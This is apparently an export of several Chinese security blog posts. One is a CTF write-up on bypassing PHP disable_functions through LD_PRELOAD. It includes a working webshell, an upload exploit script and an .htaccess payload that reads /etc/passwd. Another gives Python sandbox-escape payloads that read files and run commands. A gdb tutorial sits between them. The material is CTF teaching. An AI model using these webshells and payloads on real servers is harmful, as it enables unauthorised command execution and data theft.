1234567891011121314151617181920212223242526272829303132333435&lt;?php //Enter your code here, enjoy!class dep &#123;&#125;class FlagSDK &#123;protected $flagPath;public function verify($key)&#123; if (sha1($key) === $this-&gt;getHash()) &#123; return &quot;Its&apos;s a flag&quot;; &#125; return false;&#125;public function getHash()&#123; return &apos;xxxxx&apos;;&#125;&#125;$ref = new ReflectionClass(&apos;FlagSDK&apos;);$inst = $ref-&gt;newInstanceWithoutConstructor();$list = $ref-&gt;getProperties();foreach($list as $prop)&#123; /* @var $prop ReflectionProperty */ $prop-&gt;getDocComment(); //grep for @inject and the @vars class name $prop-&gt;setAccessible(true); $prop-&gt;setValue($inst, new dep());&#125;if($const = $ref-&gt;getConstructor()) &#123; $constName = $const-&gt;getName(); $inst-&gt;&#123;$constName&#125;(); //use call_user_func_array($function, $param_arr); for arguments &#125;print_r($inst);print_r($inst-&gt;verify(&apos;1&apos;)); //property still not accessable 这样我们就可以注入一个dep类到$flagPath中了（实际上貌似没有啥用。 五、其他 当然通过反射我们能够实现很多其他有趣的东西，具体的化可以看PHP手册。]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[bypass disable function的学习与实践]]></title>
    <url>%2F2019%2F03%2F29%2Fbypass%20disable%20function%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[前言当千辛万苦拿到的webshell居然无法执行系统命令无疑是令人抓狂的。那么我们该如何绕过它呢？这里主要以Insomnihack Teaser 2019 Web题 l33t-hoster来讲解，本文主要讲通过LD_PRELOAD 来达到bypass的目的。 正文相信大家都知道PHP.ini中有的php控制器functions_disable会禁用一些危险的系统函数防止被黑客攻击。例如system（）或exec（）或shell_exec（），甚至我们不太知道的函数，如dl（）那么该怎么办呢？我们可以通过一定手法进行bypass disable_functions有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 一.利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。 我们可以通过PHP中mail（）函数使用LD_PRELOAD变量注入一些恶意的应用程序中比如getuid（）提起LD_PRELOAD变量先说明下程序的链接，程序的链接分为静态链接和动态链接，动态链接程序运行时动态地载入函数库，但一旦我们采取动态链接我们的程序就有被‘劫持’的可能在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker）。很明显通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。 而mail（）函数，mail（）函数会在/ usr / sbin / sendmail里面启动，而我们的脚本将会调用一些系统函数（API如getuid（）），我们可以通过LD_PRELOAD来注入一些恶意代码。 所以这里我们的bypass思路很明显了使用mail（）函数通过LD_PRELOAD变量覆盖，达到执行系统函数的目的。payload（它是免杀的哦，可以当作小马使用） 12345678910111213&lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = $_GET[&quot;cmd&quot;]; $out_path = $_GET[&quot;outpath&quot;]; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = $_GET[&quot;sopath&quot;]; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path);?&gt; 当然还要再辅助一个.so文件才行具体请看 https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD/blob/master/README.md 举个例子前段时间的Insomnihack Teaser 2019 Web题 l33t-hoster l33t-hoster WriteUp bypass disable function题目1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980&lt;?phpif (isset($_GET[&quot;source&quot;])) die(highlight_file(__FILE__));session_start();if (!isset($_SESSION[&quot;home&quot;])) &#123; $_SESSION[&quot;home&quot;] = bin2hex(random_bytes(20));&#125;$userdir = &quot;images/&#123;$_SESSION[&quot;home&quot;]&#125;/&quot;;if (!file_exists($userdir)) &#123; mkdir($userdir);&#125;$disallowed_ext = array( &quot;php&quot;, &quot;php3&quot;, &quot;php4&quot;, &quot;php5&quot;, &quot;php7&quot;, &quot;pht&quot;, &quot;phtm&quot;, &quot;phtml&quot;, &quot;phar&quot;, &quot;phps&quot;,);if (isset($_POST[&quot;upload&quot;])) &#123; if ($_FILES[&apos;image&apos;][&apos;error&apos;] !== UPLOAD_ERR_OK) &#123; die(&quot;yuuuge fail&quot;); &#125; $tmp_name = $_FILES[&quot;image&quot;][&quot;tmp_name&quot;]; $name = $_FILES[&quot;image&quot;][&quot;name&quot;]; $parts = explode(&quot;.&quot;, $name); $ext = array_pop($parts); if (empty($parts[0])) &#123; array_shift($parts); &#125; if (count($parts) === 0) &#123; die(&quot;lol filename is empty&quot;); &#125; if (in_array($ext, $disallowed_ext, TRUE)) &#123; die(&quot;lol nice try, but im not stupid dude...&quot;); &#125; $image = file_get_contents($tmp_name); if (mb_strpos($image, &quot;&lt;?&quot;) !== FALSE) &#123; die(&quot;why would you need php in a pic.....&quot;); &#125; if (!exif_imagetype($tmp_name)) &#123; die(&quot;not an image.&quot;); &#125; $image_size = getimagesize($tmp_name); if ($image_size[0] !== 1337 || $image_size[1] !== 1337) &#123; die(&quot;lol noob, your pic is not l33t enough&quot;); &#125; $name = implode(&quot;.&quot;, $parts); move_uploaded_file($tmp_name, $userdir . $name . &quot;.&quot; . $ext);&#125;echo &quot;&lt;h3&gt;Your &lt;a href=$userdir&gt;files&lt;/a&gt;:&lt;/h3&gt;&lt;ul&gt;&quot;;foreach(glob($userdir . &quot;*&quot;) as $file) &#123; echo &quot;&lt;li&gt;&lt;a href=&apos;$file&apos;&gt;$file&lt;/a&gt;&lt;/li&gt;&quot;;&#125;echo &quot;&lt;/ul&gt;&quot;;?&gt;&lt;h1&gt;Upload your pics!&lt;/h1&gt;&lt;form method=&quot;POST&quot; action=&quot;?&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;image&quot;&gt; &lt;input type=&quot;submit&quot; name=upload&gt;&lt;/form&gt; write up12341.这道题禁止php后缀的文件，或者是同意的后缀文件上传2.上传必须满足getimagesize（）函数3.图片必须是大小为1337x1337的有效图像4.上传的文件不能包含&lt;?。 这里并没有禁用.htaccess，我们可以通过上传.htaccess文件构造，使一种我们想要的后缀格式解析成php。 123php_value是.htaccess文件中可以用的指令之一。该指令允许我们使用PHP_INI_PERDIR标志修改此处列表里的任何设置。在这些设置中，有个auto_append_file，它允许我们在请求PHP文件时添加或包含一个文件。后来发现，auto_append_file还允许各种包装器，如php://。 我们可以构造.htaccess文件内容为，将以.corb3nik为文件后缀的文件解析为php文件，并且当我们发起一个php文件请求时返回我们需要的内容。 12AddType application/x-httpd-php .corb3nikphp_value auto_append_file &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot; 现在我们需要构造一个满足getimagesize()的.htaccess文件，在.htaccess文件中#与\x00为注释符号所以我们只需要构造一个满足二进制头为\x00且满足getimagesize函数的文件即可，需要满足如下文件格式我们可以构造.wbmp文件并以如下作为开头，我们便可以构造任意的脚本了 10000 8a39 8a39 如何绕过&lt;? 的限制呢？1.使用base64编码2.使用php_value zend.script_encoding “UTF-7” 使用utf-7进行绕过所以我们就可以通过类似以下脚本，配合一个.so文件就可以执行我么想要的命令了 123456789101112131415161718192021222324252627282930313233343536373839404142434445#!/usr/bin/env python3import requestsimport base64VALID_WBMP = b&quot;\x00\x00\x8a\x39\x8a\x39\x0a&quot;URL = &quot;xxx&quot;RANDOM_DIRECTORY = &quot;d53f37bed6ba5becd1993231b9a07593d6939b2a&quot;COOKIES = &#123; &quot;PHPSESSID&quot; : &quot;btvfccrafpo65jd9oa64u26bf2&quot;&#125;def upload_content(name, content): data = &#123; &quot;image&quot; : (name, content, &apos;image/png&apos;), &quot;upload&quot; : (None, &quot;Submit Query&quot;, None) &#125; response = requests.post(URL, files=data, cookies=COOKIES)HT_ACCESS = VALID_WBMP + b&quot;&quot;&quot;AddType application/x-httpd-php .corb3nikphp_value auto_append_file &quot;php://filter/convert.base64-decode/resource=shell.corb3nik&quot;&quot;&quot;&quot;TARGET_FILE = VALID_WBMP + b&quot;AAA&quot; + base64.b64encode(b&quot;&quot;&quot;&lt;?php echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;; $cmd = &quot;pwd&quot;; $out_path = &quot;_0utput.txt&quot;; $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;; echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;; putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline); $so_path = &quot;/var/www/bypass_disablefunc_x64.so&quot;; putenv(&quot;LD_PRELOAD=&quot; . $so_path); mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;); echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; unlink($out_path);?&gt;&quot;&quot;&quot;)upload_content(&quot;..htaccess&quot;, HT_ACCESS)upload_content(&quot;shell.corb3nik&quot;, TARGET_FILE)upload_content(&quot;trigger.corb3nik&quot;, VALID_WBMP)response = requests.post(URL + &quot;/images/&quot; + RANDOM_DIRECTORY + &quot;/trigger.corb3nik&quot;)print(response.text) 这里还有一个问题，我们该如何上传so文件呢？我们时不可以构造满足函数getimagesize（）的so文件的，经过发现我们可以找到move_uploaded_file并没有被禁用，于是我们可以构造一个文件上传的PHP文件如下，我们便可以上传so文件 12345&lt; form method = “ POST ” action = “ upl.asp ” enctype = “ multipart / form-data ” &gt; &lt; input type = “ file ” name = “ image ” &gt; &lt; input type = “ text ” name = “ name ” &gt; &lt; input type = “ submit ” name = upload &gt;&lt;/ form &gt; 通过这样我们就可以执行任意我们想要的系统命令了。当然我们也可以直接上传一个文件通过如下payload也可以造成相同效果 1move_uploaded_file($_FILES[&apos;evil&apos;][&apos;tmp_name&apos;], &apos;/tmp/evil.so&apos;); 12其实我们可以构造类似这样的payloadPHP的mail()函数调用execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], ...)。 但是貌似这样时没有回显的。 当然我个人是认为smod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制也是可以的。 有关文件上传的函数请查阅函数 is_uploaded_file() 和 move_uploaded_file() 以获取进一步的信息。以下范例处理由表单提供的文件上传。 附加备忘 1查看进程调用系统函数明细。linux 创建新进程的过程较为复杂，我关心进程加载了哪些共享对象、可能调用哪些 API、实际调用了哪些 API。比如，运行 /usr/bin/id，通过 ldd 可查看系统为其加载的共享对象： 参考 https://blog.csdn.net/haoel/article/details/1602108https://www.k0rz3n.com/2019/02/12/PHP%20%E4%B8%AD%E5%8F%AF%E4%BB%A5%E5%88%A9%E7%94%A8%E7%9A%84%E5%8D%B1%E9%99%A9%E7%9A%84%E5%87%BD%E6%95%B0/#https://github.com/l3m0n/Bypass_Disable_functions_Shellhttps://blog.csdn.net/haoel/article/details/1602108 https://xz.aliyun.com/t/3941#toc-2https://blog.mythsman.com/2015/12/01/1/https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.mdhttp://php.net/manual/zh/features.file-upload.post-method.phphttps://blog.csdn.net/qq_27446553/article/details/80235811https://www.freebuf.com/articles/web/192052.html]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[从零开始学习使用gdb调试PHP源码]]></title>
    <url>%2F2019%2F03%2F29%2F%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E5%AD%A6%E4%B9%A0%E4%BD%BF%E7%94%A8gdb%E8%B0%83%E8%AF%95PHP%E6%BA%90%E7%A0%81%2F</url>
    <content type="text"><![CDATA[前言GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具； 基础命令123456789101112131415b/break ：设置断点delete ：清除断点continue ：继续终止的程序run/r ：运行程序step/s ：单步运行，进入函数next/n ：单步运行，不进入函数list/l ：显示源代码，每次显示10行bt/backtrace ：显示栈中的内容print/p ：显示queue中的内容kill ：终止正在调试的程序file ：装入将要调试的文件info variables 命令将打印出所有程序变量的值info locals 命令时，gdb 会打印出当前帧中的局部变量bt 程序“调用堆栈”是当前函数之前的所有已调用函数的列表（包括当前函数）q ：退出gdb gdb调试入门简单的使用gdb分析程序错误将以下样本代码保存成.c文件格式,这段程序意思为循环十次并输出，使用gcc -g eg1.c -o eg1 进行编译 123456789101112131415161718192021222324#include &lt;stdio.h&gt;int wib(int no1, int no2)&#123; int result, diff; diff = no1 - no2; result = no1 / diff; return result;&#125;int main(int argc, char *argv[])&#123; int value, div, result, i, total; value = 10; div = 6; total = 0; for(i = 0; i &lt; 10; i++) &#123; result = wib(value, div); total += result; div++; value--; &#125; printf(&quot;%d wibed by %d equals %d\n&quot;, value, div, total); return 0;&#125; 当我们直接执行./eg1，时候会爆出Floating point exception错误，我们需要使用gdb调试来寻找这个错误 12root@iZwz9hyvb5rjm3oubt8o15Z:~/gbk_test# ./eg1 Floating point exception 我们将使用gdb eg1启动gdb（没有安装的需要apt-get install gdb)，启动后我们直接使用run命令运行我们的程序，如下可以看到在第6行的时候发生了一个错误。 123Program received signal SIGFPE, Arithmetic exception.0x000000000040053d in wib (no1=8, no2=8) at eg1.c:66 result = no1 / diff; 我们使用print no1 print diff 来打印出这两个变量的值，可以看出出错的原因是因为diff值为0导致算术异常 1234(gdb) print no1 $1 = 8(gdb) print diff$2 = 0 当发现异常后，假若我们使用continue命令，程序将继续执行下去， 1234Continuing.Program terminated with signal SIGFPE, Arithmetic exception.The program no longer exists. 使用断点进行分析我们可以使用break命令进行断点，比如我们想知道main函数中到底是什么导致了错误发生我们可以使用break main ， 并且我们可以使用list main 来查看main 附近10 行代码的具体情况 ，使用回车可以继续查看接下来的10行代码， 12345615 for(i = 0; i &lt; 10; i++)16 &#123;17 result = wib(value, div);18 total += result;19 div++;20 value--; 我们可以看到，在第17行的时候我们使用了wib 函数 ，于是我们使用break 17 来设置断点 （ 当然任何我们感兴趣的函数我们都可以设置断点进行查看） 12(gdb) break 17 Breakpoint 2 at 0x400575: file eg1.c, line 17. 我们可以使用info break 来查看当前设置的断点情况。 1234(gdb) info breakNum Type Disp Enb Address What1 breakpoint keep y 0x0000000000400557 in main at eg1.c:122 breakpoint keep y 0x0000000000400575 in main at eg1.c:17 我们也可以使用delete 1 删除第一个断点（可以使用命令 &#39;disable &lt;breakpoint number&gt;&#39;、&#39;enable &lt;breakpoint number&gt;&#39; 或 &#39;delete &lt;breakpoint number&gt;&#39; 来禁用、启用和彻底删除断点，），再次查看的时候我们可以看到断点1 已经被我们删除成功了 1234(gdb) delete 1(gdb) info breakNum Type Disp Enb Address What2 breakpoint keep y 0x0000000000400575 in main at eg1.c:17 我们重新使用run，这时候程序将会终端在我们设置断点的位置，我们可也使用print 将wib 函数的 参数打印出来，当然我们同样可以使用info locals命令将局部变量值打印出来 123456789(gdb) runStarting program: /root/gbk_test/eg1 Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:1717 result = wib(value, div);(gdb) print value $3 = 10(gdb) print div$4 = 6 123456(gdb) info localsvalue = 10div = 6result = 0i = 0total = 0 我们可以使用next进入函数中查看value div两变量的变化情况 12345678910111213141516171819202122232425262728(gdb) next18 total += result;(gdb) 19 div++;(gdb) 20 value--;(gdb) 15 for(i = 0; i &lt; 10; i++)(gdb) Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:1717 result = wib(value, div);(gdb) 18 total += result;(gdb) 19 div++;(gdb) 20 value--;(gdb) 15 for(i = 0; i &lt; 10; i++)(gdb) Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:1717 result = wib(value, div);(gdb) print value$5 = 8(gdb) print div$6 = 8 在连续两次后 我们发现 value以及div的值都为8，继续使用next，我们可以得出结论当value与div值相等的时候程序会发生算术错误 123Program received signal SIGFPE, Arithmetic exception.0x000000000040053d in wib (no1=8, no2=8) at eg1.c:66 result = no1 / diff; 我们重新run一次，这次我们使用condition命令，这样我们就不需要多次使用next查看，这样我们就一次就可以得到我们想要的结果了 123456789(gdb) run The program being debugged has been started already.Start it from the beginning? (y or n) yStarting program: /root/gbk_test/eg1 Breakpoint 2, main (argc=1, argv=0x7fffffffe5a8) at eg1.c:1717 result = wib(value, div);(gdb) print value$8 = 8 使用gdb调试php源码源码编译安装php 重要事情说100遍 预备知识PHP内部，变量都会用一个zval的结构体（struct）来表示： 123456typedef struct _zval_struct &#123; zvalue_value value; zend_uint refcount__gc; zend_uchar type; zend_uchar is_ref__gc;&#125; zval; 其中用于保存变量的值的字段是value，它的类型是zvalue_value，这是一个联合体(union)： 12345678910typedef union _zvalue_value &#123; long lval; double dval; struct &#123; char *val; int len; &#125; str; HashTable *ht; zend_object_value obj;&#125; zvalue_value; 如果变量的类型为整型，则使用lval这个字段存储它的值，如果是浮点型，则使用dval存储它的值。在zval结构体中有一个zend_uchar型的字段type来标识变量的类型，PHP内部提供了一些宏来表示变量的类型： 123456789Type tag Storage locationIS_NULL none IS_BOOL long lvalIS_LONG long lvalIS_DOUBLE double dvalIS_STRING struct &#123; char *val; int len; &#125; strIS_ARRAY HashTable *htIS_OBJECT zend_object_value objIS_RESOURCE long lval 入门让我们继续探索下php弱类型（以下面一个例子就好了，以下结果会返回true） 1./php -r &apos;var_dump([]&gt;1);&apos; 我们将断点设在is_smaller_function，至于为什么，我之前文章有提及，run，list 123456789102177 ZEND_API int ZEND_FASTCALL is_smaller_function(zval *result, zval *op1, zval *op2) /* &#123;&#123;&#123; */2178 &#123;2179 if (compare_function(result, op1, op2) == FAILURE) &#123;2180 return FAILURE;2181 &#125;2182 ZVAL_BOOL(result, (Z_LVAL_P(result) &lt; 0));(gdb) 2183 return SUCCESS;2184 &#125;2185 /* &#125;&#125;&#125; */ 这里很显然使用compare_function进行比较，我们再次设置断点，continue，我们将 这三个变量打印出来zval *result, zval *op1, zval *op2 12345678910111213141516171819(gdb) print *result$1 = &#123;value = &#123;lval = 20888608, dval = 1.0320343602244629e-316, counted = 0x13ebc20 &lt;compiler_globals&gt;, str = 0x13ebc20 &lt;compiler_globals&gt;, arr = 0x13ebc20 &lt;compiler_globals&gt;, obj = 0x13ebc20 &lt;compiler_globals&gt;, res = 0x13ebc20 &lt;compiler_globals&gt;, ref = 0x13ebc20 &lt;compiler_globals&gt;, ast = 0x13ebc20 &lt;compiler_globals&gt;, zv = 0x13ebc20 &lt;compiler_globals&gt;, ptr = 0x13ebc20 &lt;compiler_globals&gt;, ce = 0x13ebc20 &lt;compiler_globals&gt;, func = 0x13ebc20 &lt;compiler_globals&gt;, ww = &#123;w1 = 20888608, w2 = 0&#125;&#125;, u1 = &#123;v = &#123;type = 61 &apos;=&apos;, type_flags = 0 &apos;\000&apos;, const_flags = 0 &apos;\000&apos;, reserved = 0 &apos;\000&apos;&#125;, type_info = 61&#125;, u2 = &#123;next = 0, cache_slot = 0, lineno = 0, num_args = 0, fe_pos = 0, fe_iter_idx = 0, access_flags = 0, property_guard = 0, extra = 0&#125;&#125;(gdb) print *op1$2 = &#123;value = &#123;lval = -1, dval = -nan(0xfffffffffffff), counted = 0xffffffffffffffff, str = 0xffffffffffffffff, arr = 0xffffffffffffffff, obj = 0xffffffffffffffff, res = 0xffffffffffffffff, ref = 0xffffffffffffffff, ast = 0xffffffffffffffff, zv = 0xffffffffffffffff, ptr = 0xffffffffffffffff, ce = 0xffffffffffffffff, func = 0xffffffffffffffff, ww = &#123;w1 = 4294967295, w2 = 4294967295&#125;&#125;, u1 = &#123;v = &#123;type = 4 &apos;\004&apos;, type_flags = 0 &apos;\000&apos;, const_flags = 0 &apos;\000&apos;, reserved = 0 &apos;\000&apos;&#125;, type_info = 4&#125;, u2 = &#123;next = 0, cache_slot = 0, lineno = 0, num_args = 0, fe_pos = 0, fe_iter_idx = 0, access_flags = 0, property_guard = 0, extra = 0&#125;&#125;(gdb) print *op2$3 = &#123;value = &#123;lval = 140737184649664, dval = 6.9533408027815013e-310, counted = 0x7fffede5d1c0, str = 0x7fffede5d1c0, arr = 0x7fffede5d1c0, obj = 0x7fffede5d1c0, res = 0x7fffede5d1c0, ref = 0x7fffede5d1c0, ast = 0x7fffede5d1c0, zv = 0x7fffede5d1c0, ptr = 0x7fffede5d1c0, ce = 0x7fffede5d1c0, func = 0x7fffede5d1c0, ww = &#123; w1 = 3991261632, w2 = 32767&#125;&#125;, u1 = &#123;v = &#123;type = 7 &apos;\a&apos;, type_flags = 20 &apos;\024&apos;, const_flags = 0 &apos;\000&apos;, reserved = 0 &apos;\000&apos;&#125;, type_info = 5127&#125;, u2 = &#123; next = 32767, cache_slot = 32767, lineno = 32767, num_args = 32767, fe_pos = 32767, fe_iter_idx = 32767, access_flags = 32767, property_guard = 32767, extra = 32767&#125;&#125; 进入compare_function，next 1zendi_convert_scalar_to_number(op2, op2_copy, result, 1); 可以看到这里进行了类型转化将op2转化成number，break zendi_convert_scalar_to_number 参考 使用 GDB 调试 Linux 软件 调式PHP源码 GNU GCC中文文档深入理解Zend执行引擎（PHP5）Ubuntu 16.04 编译安装 PHP 7.2]]></content>
      <categories>
        <category>文章</category>
      </categories>
      <tags>
        <tag>PHP内核分析</tag>
        <tag>gdb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python服务端模板注入与沙盒逃逸的学习小结与实践]]></title>
    <url>%2F2019%2F03%2F20%2FPython%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%B2%99%E7%9B%92%E9%80%83%E9%80%B8%E7%9A%84%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E8%B7%B5%2F</url>
    <content type="text"><![CDATA[前言就注入类型的漏洞来说，常见 Web 注入有：SQL 注入，XSS 注入，XPATH 注入，XML 注入，代码注入，命令注入等等。注入漏洞的实质是服务端接受了用户的输入，未过滤或过滤不严谨执行了拼接了用户输入的代码，因此造成了各类注入。 正常而言，出于安全考虑，模板引擎基本上都是拥有沙盒、命名空间的，代码的解析执行都是发生在有限的沙盒里面，因此，沙盒逃逸也成为 SSTI 不可或缺的存在。 这里其实主要讲关于沙盒逃逸的，因为模板注入的话，我自己看哪些模板引擎的源码也不是非常懂里面到底写什么，很难比较深入的阐述，因为一般来说沙盒逃逸经常伴随着模板注入所以这里模板注入还是提一提，总的来说这篇其实是对沙盒逃逸常见payload的讲解。 正文服务端模板注入通过模板，Web应用可以把输入转换成特定的HTML文件或者email格式。服务端模板注入，顾名思义，就是通过在服务端的模板文件或模板字符串中注入特定的恶意代码导致产生代码执行的一种漏洞攻击方式。不同的模板引擎，根据不同的解析方式相应的也是存在不同的利用方法。 服务端模板注入漏洞探测详细来自 https://zhuanlan.zhihu.com/p/28823933 漏洞一般出现在这两种情况下，而每种有不同的探测手法：文本类大部分的模板语言支持我们输入 HTML，比如： 12345678smarty=Hello &#123;user.name&#125;Hello user1 freemarker=Hello $&#123;username&#125;Hello newuser any=&lt;b&gt;Hello&lt;/b&gt;&lt;b&gt;Hello&lt;b&gt; 代码类在一些环境下，用户的输入也会被当作模板的可执行代码。比如说变量名： personal_greeting=usernameHello user01 我们可以通过破坏 template 语句，并附加注入的HTML标签以确认漏洞： 1234personal_greeting=username&lt;tag&gt;Hellopersonal_greeting=username&#125;&#125;&lt;tag&gt;Hello user01 &lt;tag&gt; 为什么模板注入可以使用沙盒绕过模板支持对应语言的“编程功能”以及一些简单的运算模板并不是静态的放进去，虽然模板产品类型很多，但或多或少都能执行一些逻辑 name=20 name=4 而在python的Jinja2模板中，就能支持更多更强大的逻辑： 1234from jinja2 import Templatestr = &quot;&#123;% for i in [1,2,3] %&#125;&#123;&#123; i &#125;&#125;&#123;% endfor %&#125;&quot;template = Template(&apos;your input: &#123;&#125;&apos;.format(str))print (template.render()) 其实我个人理解，就是在一些模板引擎中会有注册一些自己使用模块，没有注册的模块是不能使用的，所以沙盒逃逸其实就是一种被限制情况下的python终端 例题1SSTI in Tornado护网杯 2018 WEB (1) easy_tornado详解 &gt;https://www.virzz.com/2018/10/15/python_from_ssti_to_sandbox_1.html#toc-4 沙盒技术实际上，沙盒就是一种类似影子系统的虚拟系统环境，它比带有宿主的虚拟机有着更深层次的系统内核级技术。它可以接管恶意软件的功能调用接口或函数行为，并且在确认了病毒行为之后实行回滚机制，并让系统保持一种干净的状态。详细可以看这里 python沙盒逃逸概述沙箱逃逸,可以认为是从一个被限制的python环境绕过种种过滤和限制最周拿到更高权限甚至getshell，这是我们的最终的目的，但是实现这个目标之前我们必须解决的就是如何绕过重重的waf去使用python执行命令 这是我在K0rz3n师傅博客里看到的一段攻防可以很形象的描述，可以推荐先看看，传送门 沙盒逃逸就是要在这样一种受到到限制的情况下，不断绕过限制最终达成getshell等目的 想要深入了解沙盒逃逸，python魔法方法肯定是要知道的，不然很容易知其然不知其所以然，一旦题目有了一定变化就容易不知所措。1.魔法方法简介我觉得想要较为深入了解python沙盒逃逸的内容必须先了解下python魔法方法，关于这些魔术方法在下面需要的时候我会讲解。 沙盒逃逸常见 payload112345678#读文件().__class__.__bases__[0].__subclasses__()[40](r&apos;C:\1.php&apos;).read()#写文件().__class__.__bases__[0].__subclasses__()[40](&apos;/var/www/html/input&apos;, &apos;w&apos;).write(&apos;123&apos;)#执行任意命令().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13][&apos;eval&apos;](&apos;__import__(&quot;os&quot;).popen(&quot;ls /var/www/html&quot;).read()&apos; ) 1.1.().xxx在一些沙盒逃逸的pyload中经常会出现’ ‘.xxx.xxx.xx或者是().xxx.xxx.xxx,[].xxx.xxx.xx如果不是比较了解python的话理解起来其实是比较困难的我现在来讲解下首先type下‘ ’，和() ,[] tuple是一种有序列表叫元组，和list非常类似，但是tuple一旦初始化就不能修改 1.2. ().__class__().__class__是什么意思呢？当然想要明白这个问题首先我们得先知道下typle与__class__的差别 type()type 这个类实例化了一切，包括 object 和 他自己1234567891011&gt;&gt;&gt; type(1)&lt;class &apos;int&apos;&gt;&gt;&gt;&gt; type(int)&lt;class &apos;type&apos;&gt;&gt;&gt;&gt; type(type)&lt;class &apos;type&apos;&gt;&gt;&gt;&gt; type(object)&lt;class &apos;type&apos;&gt; 结论：type-&gt;class-&gt;obj2.objectobject 是最顶层的基类，所有的类都继承了Object，包括type但是 object 是由 type 实例化的 示例代码： __class__ __class__与type()极为接近，但是有一定差别 (1)我们可以从一个对象实例到他的类‘ ‘.__class__ 仅仅从上面两个例子确实是很难看出type与__class__之间的区别，不过我们这里姑且暂时简单将其理解为是type（）想要具体了解的可以看这里 http://brionas.github.io/2014/09/15/python-type-class/ 1.3. ().__class__.__bases__[0]元组，包含 类型对象(type, class) C 的全部基类，类型的实例通常没有属性 __bases__。概念其实是比较难理解的我们直接举例子 这里我们可以看到通过__base__我们得到了object对象那么这里又出现了个问题 __base__ 与__bases__有什么区别呢？ __bases[0]__base__ 我们定义了两个类，M继承了C。 12345678&gt; &gt;&gt;&gt; class C(object): pass&gt; ...&gt; &gt;&gt;&gt; class M(C,type): pass&gt; ...&gt; &gt;&gt;&gt; M.__bases__[0]&gt; &lt;class &apos;__main__.C&apos;&gt;&gt; &gt;&gt;&gt; M.__base__&gt; &lt;type &apos;type&apos;&gt; 我们可以看到M.__base__是自己定义的type而 M.__bases__确是C再举个例子 123class A(object): passclass B(dict): passclass C(A, B): pass 12 C.__base__&lt;class &apos;__main__.B&apos;&gt; 为什么呢？因为B定义了C的基类所以C.__base__是B 这里要先知道的是一般情况下，python中一个子类只能有一个基类 继续看 123&gt;&gt;&gt; class A(object): pass... &gt;&gt;&gt; class B(A,type): pass 12&gt;&gt;&gt; B.__bases__(&lt;class &apos;__main__.A&apos;&gt;, &lt;type &apos;type&apos;&gt;) 